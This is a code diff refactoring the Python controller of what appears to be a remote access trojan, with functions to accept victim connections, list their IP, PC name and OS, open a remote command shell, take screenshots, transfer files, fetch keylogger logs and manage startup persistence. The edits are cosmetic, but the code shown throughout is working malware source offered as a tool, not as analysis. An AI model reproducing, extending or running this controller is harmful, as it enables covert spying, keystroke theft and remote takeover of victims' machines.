@@ -79,14 +79,14 @@ def socket_accept():
             client_info = decode_utf8(conn.recv(intBuff)).split("`,")
             address += client_info[0], client_info[1], client_info[2],
             arrAddresses.append(address)
-            print("\n" + "Connection has been established: {0} ({1})".format(address[0], address[2]))
+            print("\nConnection has been established: {0} ({1})".format(address[0], address[2]))
         except socket.error:
             print("Error accepting connections!")
             continue
 
 
 def menu_help():
-    print("\n" + "--help")
+    print("\n--help")
     print("--l List all connections")
     print("--i Interact with connection")
     print("--e Open remote cmd with connection")
@@ -97,7 +97,7 @@ def menu_help():
 
 def main_menu():
     while True:
-        strChoice = input("\n" + ">> ")
+        strChoice = input("\n>> ")
 
         refresh_connections()  # refresh connection list
 
@@ -169,10 +169,11 @@ def list_connections():
                         str(arrAddresses[intCounter][1]) + 4*" " + str(arrAddresses[intCounter][2]) + 4*" " + \
                         str(arrAddresses[intCounter][3]) + "\n"
 
-        print("\n" + "ID" + 3*" " + center(str(arrAddresses[0][0]), "IP") + 4*" " +
-            center(str(arrAddresses[0][1]), "Port") + 4*" " +
-            center(str(arrAddresses[0][2]), "PC Name") + 4*" " +
-            center(str(arrAddresses[0][3]), "OS") + "\n" + strClients, end="")
+        strInfo = f"\nID{3*' '}"
+        for index, text in enumerate(["IP", "Port", "PC Name", "OS"]):
+            strInfo += center(str(arrAddresses[0][index]), text) + 4*" "
+        strInfo += f"\n{strClients}"
+        print(strInfo, end='')
     else:
         print("No connections.")
 
@@ -189,12 +190,12 @@ def select_connection(connection_id, blnGetResponse):
         '''
         IP, PC Name, OS, User
         '''
-        arrInfo = str(arrAddresses[connection_id][0]), str(arrAddresses[connection_id][2]), \
-                                                              str(arrAddresses[connection_id][3]), \
-                                                              str(arrAddresses[connection_id][4])
+        arrInfo = ''
+        for index in [0, 2, 3, 4]:
+            arrInfo += str(arrAddresses[connection_id][index])
 
         if blnGetResponse == "True":
-            print("You are connected to " + arrInfo[0] + " ...." + "\n")
+            print(f"You are connected to {arrInfo[0]} ....\n")
         return conn
 
 
@@ -210,30 +211,28 @@ def send_command_all(command):
 
 
 def user_info():
-    print("IP: " + arrInfo[0])
-    print("PC Name: " + arrInfo[1])
-    print("OS: " + arrInfo[2])
-    print("User: " + arrInfo[3])
+    for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
+        print(text + arrInfo[index])
 
 
 def screenshot():
     send(str.encode("screen"))
     strClientResponse = decode_utf8(recv(intBuff))  # get info
-    print("\n" + strClientResponse)
+    print(f"\n{strClientResponse}")
 
     intBuffer = ""
-    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
-        if strClientResponse[intCounter].isdigit():
-            intBuffer += strClientResponse[intCounter]
+    for strResponse in strClientResponse:  # get buffer size from client response
+        if strResponse.isdigit():
+            intBuffer += strResponse
     intBuffer = int(intBuffer)
 
     strFile = time.strftime("%Y%m%d%H%M%S" + ".png")
 
     ScrnData = recvall(intBuffer)  # get data and write it
-    objPic = open(strFile, "wb")
-    objPic.write(ScrnData); objPic.close()
+    with open(strFile, "wb") as objPic:
+        objPic.write(ScrnData)
 
-    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFile)) + " bytes")
+    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFile))} bytes")
 
 
 def browse_files():
@@ -282,25 +281,24 @@ def remove_from_startup():
 
 
 def send_file():
-    strFile = remove_quotes(input("\n" + "File to send: "))
+    strFile = remove_quotes(input("\nFile to send: "))
     if not os.path.isfile(strFile):
         print("Invalid File!")
         return
 
-    strOutputFile = remove_quotes(input("\n" + "Output File: "))
+    strOutputFile = remove_quotes(input("\nOutput File: "))
     if strOutputFile == "":  # if the input is blank
         return
 
-    send(str.encode("send" + str(os.path.getsize(strFile))))
+    send(str.encode(f"send{str(os.path.getsize(strFile))}"))
 
-    objFile = open(strFile, "rb")  # send file contents and close the file
     time.sleep(1)
-    send(objFile.read())
-    objFile.close()
+    with open(strFile, "rb") as objFile:
+        send(objFile.read())
 
     send(str.encode(strOutputFile))
 
-    print("Total bytes sent: " + str(os.path.getsize(strFile)))
+    print(f"Total bytes sent: {str(os.path.getsize(strFile))}")
 
     strClientResponse = decode_utf8(recv(intBuff))
     print(strClientResponse)
@@ -322,32 +320,31 @@ def receive():
         return
 
     intBuffer = ""
-    for intCounter in range(0, len(strClientResponse)):  # get buffer size from client response
-        if strClientResponse[intCounter].isdigit():
-            intBuffer += strClientResponse[intCounter]
+    for strResponse in strClientResponse:  # get buffer size from client response
+        if strResponse.isdigit():
+            intBuffer += strResponse
     intBuffer = int(intBuffer)
 
     file_data = recvall(intBuffer)  # get data and write it
 
     try:
-        objFile = open(strFileOutput, "wb")
-        objFile.write(file_data)
-        objFile.close()
+        with open(strFileOutput, "wb") as objFile:
+            objFile.write(file_data)
     except:
         print("Path is protected/invalid!")
         return
 
-    print("Done!!!" + "\n" + "Total bytes received: " + str(os.path.getsize(strFileOutput)) + " bytes")
+    print(f"Done!!!\nTotal bytes received: {str(os.path.getsize(strFileOutput))} bytes")
 
 
 def command_shell():  # remote cmd shell
     send(str.encode("cmd"))
-    strDefault = "\n" + decode_utf8(recv(intBuff)) + ">"
+    strDefault = f"\n{decode_utf8(recv(intBuff))}>"
     print(strDefault, end="")  # print default prompt
 
     while True:
         strCommand = input()
-        if strCommand == "quit" or strCommand == "exit":
+        if strCommand in ["quit", "exit"]:
             send(str.encode("goback"))
             break
 
@@ -405,7 +402,7 @@ def keylogger(option):
             print("No logs.")
         else:
             strLogs = decode_utf8(recvall(int(intBuffer)))  # get all data
-            print("\n" + strLogs)
+            print(f"\n{strLogs}")
 
 
 def send_command(command):
@@ -417,12 +414,12 @@ def send_command(command):
                         "========================"
 
     if os.path.isfile("command_log.txt"):
-        objLogFile = open("command_log.txt", "a")
+        strMode = "a"
     else:
-        objLogFile = open("command_log.txt", "w")
+        strMode = "w"
 
-    objLogFile.write(strClientResponse + "\n" + "\n")
-    objLogFile.close()
+    with open("command_log.txt", strMode) as objLogFile:
+        objLogFile.write(f"{strClientResponse}\n\n")
 
 
 def show_help():
@@ -450,10 +447,10 @@ def send_commands():
     show_help()
     try:
         while True:
-            strChoice = input("\n" + "Type selection: ")
+            strChoice = input("\nType selection: ")
 
             if strChoice == "--help":
-                print("\n", end="")
+                print()
                 show_help()
             elif strChoice == "--c":
                 send(str.encode("exit"))
@@ -504,7 +501,7 @@ def send_commands():
                 print("Invalid choice, please try again!")
 
     except socket.error as e:  # if there is a socket error
-        print("Error, connection was lost! :" + "\n" + str(e))
+        print(f"Error, connection was lost! :\n{str(e)}")
         return
 
 
